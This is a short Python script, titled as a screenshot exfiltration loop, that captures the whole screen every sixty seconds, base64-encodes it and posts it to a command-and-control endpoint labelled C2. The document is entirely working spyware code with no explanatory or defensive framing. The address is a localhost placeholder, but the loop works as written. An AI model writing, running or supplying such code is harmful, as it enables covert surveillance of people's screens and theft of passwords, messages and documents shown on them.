# Screenshot exfiltration loop
import time, base64, requests
from PIL import ImageGrab

C2 = "http://127.0.0.1:8443/exfil"
while True:
    img = ImageGrab.grab()
    buf = img.tobytes()
    blob = base64.b64encode(buf).decode()
    requests.post(C2, data={"screen": blob})
    time.sleep(60)
